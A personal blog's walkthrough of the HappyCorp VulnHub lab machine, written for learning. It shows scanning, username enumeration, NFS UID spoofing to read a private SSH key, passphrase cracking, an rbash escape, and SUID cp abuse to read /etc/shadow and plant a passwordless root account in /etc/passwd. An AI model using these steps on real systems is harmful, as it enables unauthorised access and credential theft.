<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="canonical" href="/vulnhub-happycorp/">

  
    
    <meta name="description" content="Hereâ€™s my write-up for HappyCorp, a VulnHub box created by Zayotic.
Write-up The description for this box states the following:
&#43;- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -&#43; | Name: Happycorp | IP: DHCP | | Date: 2019-March-05 | Goal: Get Root! | | Author: Zayotic | Difficultly: ??? | &#43;- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -&#43; | | | &#43; Average beginner/intermediate VM, only a few twists | | &#43; May find it easy/hard (depends on YOUR background) | | &#43; .">
  

  
  <link rel="manifest" href="/site.webmanifest"> 
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#000000"> 
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="theme-color" content="#ffffff">

  <style>
    body {
      visibility: hidden;
      opacity: 0;
    }
  </style>

  <link rel="stylesheet" href="/css/prism.css" media="none" onload="this.media='all';">

  
  
  <link rel="stylesheet" type="text/css" href="/css/styles.css">

  

  
  
  <title>VulnHub: HappyCorp | ben-dale.co.uk</title>
</head>

  <body>
    <a href="#main">skip to content</a>
    <noscript>
  <style>
    body {
      visibility: visible;
      opacity: 1;
    }
  </style>
</noscript>

    <svg style="display: none">
  <symbol id="bookmark" viewBox="0 0 40 50">
   <g transform="translate(2266 3206.2)">
    <path style="stroke:currentColor;stroke-width:3.2637;fill:none" d="m-2262.2-3203.4-.2331 42.195 16.319-16.318 16.318 16.318.2331-42.428z"/>
   </g>
  </symbol>

  <symbol id="w3c" viewBox="0 0 127.09899 67.763">
   <text font-size="83" style="font-size:83px;font-family:Trebuchet;letter-spacing:-12;fill-opacity:0" letter-spacing="-12" y="67.609352" x="-26.782778">W3C</text>
   <text font-size="83" style="font-size:83px;font-weight:bold;font-family:Trebuchet;fill-opacity:0" y="67.609352" x="153.21722" font-weight="bold">SVG</text>
   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m33.695.377 12.062 41.016 12.067-41.016h8.731l-19.968 67.386h-.831l-12.48-41.759-12.479 41.759h-.832l-19.965-67.386h8.736l12.061 41.016 8.154-27.618-3.993-13.397h8.737z"/>
   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m91.355 46.132c0 6.104-1.624 11.234-4.862 15.394-3.248 4.158-7.45 6.237-12.607 6.237-3.882 0-7.263-1.238-10.148-3.702-2.885-2.47-5.02-5.812-6.406-10.022l6.82-2.829c1.001 2.552 2.317 4.562 3.953 6.028 1.636 1.469 3.56 2.207 5.781 2.207 2.329 0 4.3-1.306 5.909-3.911 1.609-2.606 2.411-5.738 2.411-9.401 0-4.049-.861-7.179-2.582-9.399-1.995-2.604-5.129-3.912-9.397-3.912h-3.327v-3.991l11.646-20.133h-14.062l-3.911 6.655h-2.493v-14.976h32.441v4.075l-12.31 21.217c4.324 1.385 7.596 3.911 9.815 7.571 2.22 3.659 3.329 7.953 3.329 12.892z"/>
   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m125.21 0 1.414 8.6-5.008 9.583s-1.924-4.064-5.117-6.314c-2.693-1.899-4.447-2.309-7.186-1.746-3.527.73-7.516 4.938-9.258 10.13-2.084 6.21-2.104 9.218-2.178 11.978-.115 4.428.58 7.043.58 7.043s-3.04-5.626-3.011-13.866c.018-5.882.947-11.218 3.666-16.479 2.404-4.627 5.954-7.404 9.114-7.728 3.264-.343 5.848 1.229 7.841 2.938 2.089 1.788 4.213 5.698 4.213 5.698l4.94-9.837z"/>
   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m125.82 48.674s-2.208 3.957-3.589 5.48c-1.379 1.524-3.849 4.209-6.896 5.555-3.049 1.343-4.646 1.598-7.661 1.306-3.01-.29-5.807-2.032-6.786-2.764-.979-.722-3.486-2.864-4.897-4.854-1.42-2-3.634-5.995-3.634-5.995s1.233 4.001 2.007 5.699c.442.977 1.81 3.965 3.749 6.572 1.805 2.425 5.315 6.604 10.652 7.545 5.336.945 9.002-1.449 9.907-2.031.907-.578 2.819-2.178 4.032-3.475 1.264-1.351 2.459-3.079 3.116-4.108.487-.758 1.276-2.286 1.276-2.286l-1.276-6.644z"/>
  </symbol>

  <symbol id="tag" viewBox="0 0 177.16535 177.16535">
    <g transform="translate(0 -875.2)">
     <path style="fill-rule:evenodd;stroke-width:0;fill:currentColor" d="m159.9 894.3-68.79 8.5872-75.42 77.336 61.931 60.397 75.429-76.565 6.8495-69.755zm-31.412 31.835a10.813 10.813 0 0 1 1.8443 2.247 10.813 10.813 0 0 1 -3.5174 14.872l-.0445.0275a10.813 10.813 0 0 1 -14.86 -3.5714 10.813 10.813 0 0 1 3.5563 -14.863 10.813 10.813 0 0 1 13.022 1.2884z"/>
    </g>
  </symbol>

  <symbol id="balloon" viewBox="0 0 141.73228 177.16535">
   <g transform="translate(0 -875.2)">
    <g>
     <path style="fill:currentColor" d="m68.156 882.83-.88753 1.4269c-4.9564 7.9666-6.3764 17.321-5.6731 37.378.36584 10.437 1.1246 23.51 1.6874 29.062.38895 3.8372 3.8278 32.454 4.6105 38.459 4.6694-.24176 9.2946.2879 14.377 1.481 1.2359-3.2937 5.2496-13.088 8.886-21.623 6.249-14.668 8.4128-21.264 10.253-31.252 1.2464-6.7626 1.6341-12.156 1.4204-19.764-.36325-12.93-2.1234-19.487-6.9377-25.843-2.0833-2.7507-6.9865-7.6112-7.9127-7.8436-.79716-.20019-6.6946-1.0922-6.7755-1.0248-.02213.0182-5.0006-.41858-7.5248-.22808l-2.149-.22808h-3.3738z"/>
     <path style="fill:currentColor" d="m61.915 883.28-3.2484.4497c-1.7863.24724-3.5182.53481-3.8494.63994-2.4751.33811-4.7267.86957-6.7777 1.5696-.28598 0-1.0254.20146-2.3695.58589-5.0418 1.4418-6.6374 2.2604-8.2567 4.2364-6.281 7.6657-11.457 18.43-12.932 26.891-1.4667 8.4111.71353 22.583 5.0764 32.996 3.8064 9.0852 13.569 25.149 22.801 37.517 1.3741 1.841 2.1708 2.9286 2.4712 3.5792 3.5437-1.1699 6.8496-1.9336 10.082-2.3263-1.3569-5.7831-4.6968-21.86-6.8361-33.002-.92884-4.8368-2.4692-14.322-3.2452-19.991-.68557-5.0083-.77707-6.9534-.74159-15.791.04316-10.803.41822-16.162 1.5026-21.503 1.4593-5.9026 3.3494-11.077 6.3247-15.852z"/>
     <path style="fill:currentColor" d="m94.499 885.78c-.10214-.0109-.13691 0-.0907.0409.16033.13489 1.329 1.0675 2.5976 2.0723 6.7003 5.307 11.273 14.568 12.658 25.638.52519 4.1949.24765 14.361-.5059 18.523-2.4775 13.684-9.7807 32.345-20.944 53.519l-3.0559 5.7971c2.8082.76579 5.7915 1.727 8.9926 2.8441 11.562-11.691 18.349-19.678 24.129-28.394 7.8992-11.913 11.132-20.234 12.24-31.518.98442-10.02-1.5579-20.876-6.7799-28.959-.2758-.4269-.57803-.86856-.89617-1.3166-3.247-6.13-9.752-12.053-21.264-16.131-2.3687-.86369-6.3657-2.0433-7.0802-2.1166z"/>
     <path style="fill:currentColor" d="m32.52 892.22c-.20090-.13016-1.4606.81389-3.9132 2.7457-11.486 9.0476-17.632 24.186-16.078 39.61.79699 7.9138 2.4066 13.505 5.9184 20.562 5.8577 11.77 14.749 23.219 30.087 38.74.05838.059.12188.1244.18052.1838 1.3166-.5556 2.5965-1.0618 3.8429-1.5199-.66408-.32448-1.4608-1.3297-3.8116-4.4602-5.0951-6.785-8.7512-11.962-13.051-18.486-5.1379-7.7948-5.0097-7.5894-8.0586-13.054-6.2097-11.13-8.2674-17.725-8.6014-27.563-.21552-6.3494.13041-9.2733 1.775-14.987 2.1832-7.5849 3.9273-10.986 9.2693-18.07 1.7839-2.3656 2.6418-3.57 2.4409-3.7003z"/>
     <path style="fill:currentColor" d="m69.133 992.37c-6.2405.0309-12.635.76718-19.554 2.5706 4.6956 4.7759 9.935 10.258 12.05 12.625l4.1272 4.6202h11.493l3.964-4.4516c2.0962-2.3541 7.4804-7.9845 12.201-12.768-8.378-1.4975-16.207-2.6353-24.281-2.5955z"/>
     <rect style="stroke-width:0;fill:currentColor" ry="2.0328" height="27.746" width="22.766" y="1017.7" x="60.201"/>
    </g>
   </g>
  </symbol>

  <symbol id="info" viewBox="0 0 41.667 41.667">
   <g transform="translate(-37.035 -1004.6)">
    <path style="stroke-linejoin:round;stroke:currentColor;stroke-linecap:round;stroke-width:3.728;fill:none" d="m76.25 1030.2a18.968 18.968 0 0 1 -23.037 13.709 18.968 18.968 0 0 1 -13.738 -23.019 18.968 18.968 0 0 1 23.001 -13.768 18.968 18.968 0 0 1 13.798 22.984"/>
    <g transform="matrix(1.1146 0 0 1.1146 -26.276 -124.92)">
     <path style="stroke:currentColor;stroke-linecap:round;stroke-width:3.728;fill:none" d="m75.491 1039.5v-8.7472"/>
     <path style="stroke-width:0;fill:currentColor" transform="scale(-1)" d="m-73.193-1024.5a2.3719 2.3719 0 0 1 -2.8807 1.7142 2.3719 2.3719 0 0 1 -1.718 -2.8785 2.3719 2.3719 0 0 1 2.8763 -1.7217 2.3719 2.3719 0 0 1 1.7254 2.8741"/>
    </g>
   </g>
  </symbol>

  <symbol id="warning" viewBox="0 0 48.430474 41.646302">
    <g transform="translate(-1.1273 -1010.2)">
     <path style="stroke-linejoin:round;stroke:currentColor;stroke-linecap:round;stroke-width:4.151;fill:none" d="m25.343 1012.3-22.14 37.496h44.28z"/>
     <path style="stroke:currentColor;stroke-linecap:round;stroke-width:4.1512;fill:none" d="m25.54 1027.7v8.7472"/>
     <path style="stroke-width:0;fill:currentColor" d="m27.839 1042.8a2.3719 2.3719 0 0 1 -2.8807 1.7143 2.3719 2.3719 0 0 1 -1.718 -2.8785 2.3719 2.3719 0 0 1 2.8763 -1.7217 2.3719 2.3719 0 0 1 1.7254 2.8741"/>
    </g>
  </symbol>

  <symbol id="menu" viewBox="0 0 50 50">
     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="0" x="0"/>
     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="20" x="0"/>
     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="40" x="0"/>
   </symbol>

   <symbol id="link" viewBox="0 0 50 50">
    <g transform="translate(0 -1002.4)">
     <g transform="matrix(.095670 0 0 .095670 2.3233 1004.9)">
      <g>
       <path style="stroke-width:0;fill:currentColor" d="m452.84 192.9-128.65 128.65c-35.535 35.54-93.108 35.54-128.65 0l-42.881-42.886 42.881-42.876 42.884 42.876c11.845 11.822 31.064 11.846 42.886 0l128.64-128.64c11.816-11.831 11.816-31.066 0-42.9l-42.881-42.881c-11.822-11.814-31.064-11.814-42.887 0l-45.928 45.936c-21.292-12.531-45.491-17.905-69.449-16.291l72.501-72.526c35.535-35.521 93.136-35.521 128.64 0l42.886 42.881c35.535 35.523 35.535 93.141-.001 128.66zm-254.28 168.51-45.903 45.9c-11.845 11.846-31.064 11.817-42.881 0l-42.884-42.881c-11.845-11.821-11.845-31.041 0-42.886l128.65-128.65c11.819-11.814 31.069-11.814 42.884 0l42.886 42.886 42.876-42.886-42.876-42.881c-35.54-35.521-93.113-35.521-128.65 0l-128.65 128.64c-35.538 35.545-35.538 93.146 0 128.65l42.883 42.882c35.51 35.54 93.11 35.54 128.65 0l72.496-72.499c-23.956 1.597-48.092-3.784-69.474-16.283z"/>
      </g>
     </g>
    </g>
  </symbol>

  <symbol id="doc" viewBox="0 0 35 45">
   <g transform="translate(-147.53 -539.83)">
    <path style="stroke:currentColor;stroke-width:2.4501;fill:none" d="m149.38 542.67v39.194h31.354v-39.194z"/>
    <g style="stroke-width:25" transform="matrix(.098003 0 0 .098003 133.69 525.96)">
     <path d="m220 252.36h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
     <path style="stroke:currentColor;stroke-width:25;fill:none" d="m220 409.95h200"/>
     <path d="m220 488.74h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
     <path d="m220 331.15h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
    </g>
   </g>
 </symbol>

 <symbol id="tick" viewBox="0 0 177.16535 177.16535">
  <g transform="translate(0 -875.2)">
   <rect style="stroke-width:0;fill:currentColor" transform="rotate(30)" height="155" width="40" y="702.99" x="556.82"/>
   <rect style="stroke-width:0;fill:currentColor" transform="rotate(30)" height="40" width="90.404" y="817.99" x="506.42"/>
  </g>
 </symbol>
</svg>

    <div class="wrapper">
      <header class="intro-and-nav" role="banner">
  <div>
    <div class="intro">
      <a
        class="logo"
        href="/"
        aria-label="ben-dale.co.uk home page"
      >
        <img 
          src="/images/logo.svg" 
          alt="me">
      </a>
      <p class="library-desc">
         <center><strong><i>"just some guy that does some stuff"</i></strong></center> 
      </p>
    </div>
    <nav id="patterns-nav" class="patterns" role="navigation">
  <h2 class="vh">Main navigation</h2>
  <button id="menu-button" aria-expanded="false">
    <svg viewBox="0 0 50 50" aria-hidden="true" focusable="false">
      <use xlink:href="#menu"></use>
    </svg>
    Menu
  </button>
  
  <ul id="patterns-list">
  
    <li class="pattern">
      
      
      
      
      <a href="/" >
        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
          <use xlink:href="#bookmark"></use>
        </svg>
        <span class="text">Home</span>
      </a>
    </li>
  
    <li class="pattern">
      
      
      
      
      <a href="/tags/" >
        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
          <use xlink:href="#bookmark"></use>
        </svg>
        <span class="text">Tags</span>
      </a>
    </li>
  
    <li class="pattern">
      
      
      
      
      <a href="/index.xml" >
        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
          <use xlink:href="#bookmark"></use>
        </svg>
        <span class="text">RSS</span>
      </a>
    </li>
  
  </ul>
</nav>
    
  </div>
</header>

      <div class="main-and-footer">
        <div>
          
  <main id="main">
    <h1>VulnHub: HappyCorp</h1>
    <p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/happycorp-1,296/">HappyCorp</a>, a VulnHub box created by <a href="https://twitter.com/Zayotic">Zayotic</a>.</p>
<h3 id="write-up">Write-up</h3>
<p>The description for this box states the following:</p>
<pre><code>+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|   Name: Happycorp         |          IP: DHCP           |
|   Date: 2019-March-05     |        Goal: Get Root!      |
| Author: Zayotic           | Difficultly: ???            |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|                                                         |
| + Average beginner/intermediate VM, only a few twists   |
|   + May find it easy/hard (depends on YOUR background)  |
|   + ...also which way you attack the box                |
|                                                         |
| + It SHOULD work on VMware                              |
|   + REBOOT the VM if you CHANGE network modes           |
|   + Fusion users, you'll need to retry when importing   |
|                                                         |
|                                                         |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                                                         |
|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
|                                                         |
+---------------------------------------------------------+
</code></pre>
<p>Once I had the VM setup and running I found out the IP of the box (using <code>arp-scan</code>) and ran <code>nmap</code> to see what services were running:</p>
<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ nmap -sC -sV -oA ports 192.168.1.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 09:55 EDT
Nmap scan report for happycorp (192.168.1.189)
Host is up (0.00024s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:ea:90:61:be:0a:f2:8d:c3:4e:41:03:f0:07:8b:93 (RSA)
|   256 f6:07:4a:7e:1d:d8:cf:a7:cc:fd:fb:b3:18:ce:b3:af (ECDSA)
|_  256 64:9a:52:7b:75:b7:92:0d:4b:78:71:26:65:37:6c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin.php
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Happycorp                                                                                                                                                                                                                   
111/tcp  open  rpcbind 2-4 (RPC #100000)                                                                                                                                                                                                  
| rpcinfo:                                                                                                                                                                                                                                
|   program version    port/proto  service                                                                                                                                                                                                
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                                                                                
|   100000  2,3,4        111/udp   rpcbind                                                                                                                                                                                                
|   100000  3,4          111/tcp6  rpcbind                                                                                                                                                                                                
|   100000  3,4          111/udp6  rpcbind                                                                                                                                                                                                
|   100003  3,4         2049/tcp   nfs                                                                                                                                                                                                    
|   100003  3,4         2049/tcp6  nfs                                                                                                                                                                                                    
|   100003  3,4         2049/udp   nfs                                                                                                                                                                                                    
|   100003  3,4         2049/udp6  nfs                                                                                                                                                                                                    
|   100005  1,2,3      41864/udp6  mountd                                                                                                                                                                                                 
|   100005  1,2,3      50515/tcp6  mountd                                                                                                                                                                                                 
|   100005  1,2,3      55840/udp   mountd                                                                                                                                                                                                 
|   100005  1,2,3      58915/tcp   mountd                                                                                                                                                                                                 
|   100021  1,3,4      32975/udp6  nlockmgr                                                                                                                                                                                               
|   100021  1,3,4      44287/tcp   nlockmgr                                                                                                                                                                                               
|   100021  1,3,4      44423/tcp6  nlockmgr                                                                                                                                                                                               
|   100021  1,3,4      58961/udp   nlockmgr                                                                                                                                                                                               
|   100227  3           2049/tcp   nfs_acl                                                                                                                                                                                                
|   100227  3           2049/tcp6  nfs_acl                                                                                                                                                                                                
|   100227  3           2049/udp   nfs_acl                                                                                                                                                                                                
|_  100227  3           2049/udp6  nfs_acl                                                                                                                                                                                                
2049/tcp open  nfs_acl 3 (RPC #100227)                                                                                                                                                                                                    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>The first thing I took a look at was the http server running on port 80:</p>
<p><img src="/static/happycorp/1.png" alt=""></p>
<p>&ldquo;We&rsquo;re in the business of helping spread happiness worldwide&rdquo;. Cute ðŸ¤—.</p>
<p>Scrolling down the page a bit I came across some interesting information:</p>
<p><img src="/static/happycorp/2.png" alt=""></p>
<pre><code>Heather Eillis - heather@happycorp.local
Carolyn Vargas - carolyn@happycorp.local
Rodney Douglas - rodney@happycorp.local
Jennifer Richardson - jennifer@happycorp.local
</code></pre>
<p>I noted down these names and e-mail addresses. I also added <code>happycorp.local</code> to my <code>/etc/hosts</code> incase anything was using <code>happycorp.local</code> to resolve something.</p>
<p>I also came across a contact form but this didn&rsquo;t look to be hooked up:</p>
<p><img src="/static/happycorp/3.png" alt=""></p>
<p>Whilst I was clicking around I had <code>nikto</code> and <code>dirb</code> running in the background. Once I had finished looking around I took a look at what <code>dirb</code> and <code>nikto</code> had found.</p>
<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ nikto -host http://happycorp.local
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.189
+ Target Hostname:    happycorp.local
+ Target Port:        80
+ Start Time:         2020-03-09 10:00:44 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
...
+ OSVDB-3092: /admin.php: This might be interesting...
...

kali@kali:~$ dirb http://happycorp.local -X .php,.html
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
...
+ http://happycorp.local/admin.php (CODE:200|SIZE:469)
+ http://happycorp.local/blog.html (CODE:200|SIZE:22163)
+ http://happycorp.local/cms.php (CODE:302|SIZE:337)
+ http://happycorp.local/index.html (CODE:200|SIZE:34853)                        
</code></pre>
<p>Both <code>nikto</code> and <code>dirb</code> found <code>admin.php</code>, and <code>dirb</code> also found <code>cms.php</code> but I imagined (given the 302) that you needed a session to view this page.</p>
<p><img src="/static/happycorp/4.png" alt=""></p>
<p>I took a look at the page source and found a helpful bit of information left by Rodney:</p>
<p><img src="/static/happycorp/6.png" alt=""></p>
<p>I went with the presumption that the admin credentials were hardcoded in <code>admin.php</code>. I tried the usual <code>admin:admin</code>, waited a few seconds (which I thought was odd, it shouldn&rsquo;t be this slow, especially given the comment) and was greeted with an interesting error message:</p>
<p><img src="/static/happycorp/5.png" alt=""></p>
<p>Did this mean that I could enumerate usernames? I tried some of the names I captured before (heather, carolyn, rodney and jennifer). Attemping to log in with &ldquo;heather&rdquo; returned a different error message this time:</p>
<p><img src="/static/happycorp/7.png" alt=""></p>
<p>After trying several passwords I set up <code>hydra</code> to brute force this login form. I gave it a couple of minutes, leaving <code>hydra</code> to do its thing, and given that I was now at a dead-end, I moved onto NFS running on port 2049.</p>
<p>Running <code>showmount</code> returned the NFS server&rsquo;s export list, which only contained one thing:</p>
<pre><code>kali@kali:~$ sudo showmount -e 192.168.1.189
Export list for 192.168.1.189:
/home/karl *
</code></pre>
<p>This exposes user <code>karl</code>. I created an empty folder and mounted the share:</p>
<pre><code>kali@kali:~$ mkdir /tmp/NFS
kali@kali:~$ sudo mount 192.168.1.189:/ /tmp/NFS
kali@kali:~$ cd /tmp/NFS/home/karl
kali@kali:/tmp/NFS/home/karl$ ls -al
total 28
drwxr-xr-x 3 1001 1001 4096 Mar  5  2019 .
drwxr-xr-x 3 root root 4096 Mar  4  2019 ..
lrwxrwxrwx 1 root root    9 Mar  5  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 1001 1001  220 Mar  4  2019 .bash_logout
-rw-r--r-- 1 1001 1001 3538 Mar  5  2019 .bashrc
-rw------- 1 1001 1001   28 Mar  4  2019 .lesshst
-rw-r--r-- 1 1001 1001  675 Mar  4  2019 .profile
drwx------ 2 1001 1001 4096 Mar  5  2019 .ssh
</code></pre>
<p>I tried to <code>cd</code> into <code>.ssh</code> and got a permissions error, which made sense in my head&hellip; and then a few seconds later it didn&rsquo;t make sense. Given my rudimentary knowledge of NFS I wondered how NFS enforces file permissions when you mount a share on a different machine, with a different set of users. Could this be messed with somehow? I did some research and came across <a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/">this article</a> which backed up my thinking:</p>
<blockquote>
<p>If there are any files on the exported share that the user doesnâ€™t have permission to read them then it might be possible to trick the NFS server to believe that the user account that tries to read the file is the owner of the file. This can be achieved by performing UID (User ID) manipulation.</p>
</blockquote>
<p>I created a user on my machine named &ldquo;karl&rdquo; with the UID of 1001 and switched to <code>karl</code>:</p>
<pre><code>kali@kali:/tmp/NFS/home/karl$ su karl
$ ls -al
total 28
drwxr-xr-x 3 karl karl 4096 Mar  5  2019 .
drwxr-xr-x 3 root root 4096 Mar  4  2019 ..
lrwxrwxrwx 1 root root    9 Mar  5  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 karl karl  220 Mar  4  2019 .bash_logout
-rw-r--r-- 1 karl karl 3538 Mar  5  2019 .bashrc
-rw------- 1 karl karl   28 Mar  4  2019 .lesshst
-rw-r--r-- 1 karl karl  675 Mar  4  2019 .profile
drwx------ 2 karl karl 4096 Mar  5  2019 .ssh
</code></pre>
<p>The <code>1001</code>&rsquo;s had changed to <code>karl</code>&rsquo;s. I tried to <code>cd</code> into <code>.ssh</code> again and it worked!</p>
<pre><code>$ cd .ssh
$ ls -al
total 24
drwx------ 2 karl karl 4096 Mar  5  2019 .
drwxr-xr-x 3 karl karl 4096 Mar  5  2019 ..
-rw-r--r-- 1 karl karl  740 Mar  4  2019 authorized_keys
-rw------- 1 karl karl 3326 Mar  4  2019 id_rsa
-rw-r--r-- 1 karl karl  740 Mar  4  2019 id_rsa.pub
-rw-r--r-- 1 karl karl   18 Mar  4  2019 user.txt
</code></pre>
<p>This is also how I found the first flag:</p>
<pre><code>$ cat user.txt
flag1{Z29vZGJveQ}
</code></pre>
<p>I planned to create another ssh keypair that I controlled and to add the public key to the <code>authorized_keys</code> file in karl&rsquo;s home directory, but I only had read permissions for the entire share. The next plan was to make a copy of the private key (id_rsa) and use that to ssh in as karl.</p>
<pre><code># As karl
$ cp id_rsa /home/kali/Documents/vulnhub/happycorp1

# Back to kali user
kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa
Enter passphrase for key 'id_rsa':
</code></pre>
<p>The private key was protected by a password. Cracking this with <code>john</code> thankfully didn&rsquo;t take too long. I used <code>ssh2john.py</code> to hash the private key and used the rockyou wordlist to crack the password:</p>
<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ /usr/share/john/ssh2john.py id_rsa id_rsa.hash
</code></pre>
<p><img src="/static/happycorp/8.png" alt=""></p>
<p>I ssh&rsquo;d in as karl and had to wait a few seconds whilst some weird error messages appeared:</p>
<p><img src="/static/happycorp/9.png" alt=""></p>
<p>After searching around for some explanation I came to a conclusion that either rbash or bash (or something) was stuck in a loop. I couldn&rsquo;t exit but after some keyboard smashing (lots of Ctrl+C and <code>exit</code>s) I got into a working <code>rbash</code> shell. I couldn&rsquo;t <code>cd</code> around but that didn&rsquo;t stop me from looking at files using their full path. I wanted to take a look at <code>admin.php</code> to confirm my earlier presumptions about the hardcoded password (plus hydra still hadn&rsquo;t found the password):</p>
<p><img src="/static/happycorp/10.png" alt=""></p>
<p>The slowness that I experienced when I was trying to log into the admin page now made sense given the <code>sleep(3)</code>. The password also was hardcoded as suggested by Rodney&rsquo;s comment.</p>
<p>I logged in to the admin page using the now retrieved credentials but I didn&rsquo;t find much, just a few passive-aggressive remarks by Rodney in a barely functional CMS:</p>
<p><code>cms.php</code>:
<img src="/static/happycorp/11.png" alt=""></p>
<p><code>home.php</code>:
<img src="/static/happycorp/12.png" alt=""></p>
<p><code>backup.php</code>:
<img src="/static/happycorp/13.png" alt=""></p>
<p>This avenue didn&rsquo;t lead anywhere so I shifted my attention back to the access I had to karl&rsquo;s account. I downloaded a copy of <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a> to karl&rsquo;s home directory but rbash didn&rsquo;t let me run it. I backed out and ssh&rsquo;d in again, this time using <code>-t</code> to force a shell.</p>
<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa -t /bin/sh
</code></pre>
<p>This worked and I now had a basic unrestricted shell to mess around with. I ran <code>LinEnum</code> which found that <code>cp</code> had a SUID bit set:</p>
<p><img src="/static/happycorp/14.png" alt=""></p>
<p>I verified this by making a copy of <code>/etc/shadow</code> and viewing it:</p>
<p><img src="/static/happycorp/15.png" alt=""></p>
<p>I couldn&rsquo;t get access to root&rsquo;s home directory, but given the location of the user flag I assumed the root flag would be somewhere similar, with the name &ldquo;root.txt&rdquo;:</p>
<p><img src="/static/happycorp/16.png" alt=""></p>
<p>Although I had the flag I still didn&rsquo;t have full root-level access, so to finish the job I made a copy of <code>/etc/passwd</code> and added the following line:</p>
<pre><code>hacker::0:0:root:/root:/bin/bash
</code></pre>
<p>I had to copy the copy of <code>/etc/passwd</code> to my local machine (using <code>python -m http.server</code>) so that I could edit it. This was because <code>cp</code> has the SUID bit set and the copy of <code>/etc/passwd</code> has read-only root privilege so I couldn&rsquo;t edit it on the box. Once I made the edit I used the same method to copy the edited <code>/etc/passwd</code> file back to HappyCorp (<code>python -m http.server</code> from my machine and <code>wget</code> from the HappyCorp box) and overwrote the passwd file under <code>/etc</code>:</p>
<pre><code>$ cp passwd /etc/passwd
</code></pre>
<p><img src="/static/happycorp/17.png" alt=""></p>
<h3 id="final-thoughts">Final thoughts</h3>
<p>I enjoyed HappyCorp a lot. I was left scratching my head a couple of times but with the right amount of research, I managed to get to the root flag. Thanks for the challenge Zayotic!</p>

  </main>

          
            <footer role="contentinfo">
  <div
  
  >
    <label for="themer">
      dark theme: <input type="checkbox" id="themer" class="vh">
      
      <span aria-hidden="true"></span>
    </label>
  </div>
  
</footer>

          
        </div>
      </div>
    </div>
    

<script src="/js/dom-scripts.js"></script>  

<script src="/js/prism.js"></script>



<script src="/js/search.7aef046a0cc8b0c532f1d20087b920459bc868c936bb48a6ae221eceefca2d07.js"></script>

<link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>




    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>

    
  

  </body>
</html>
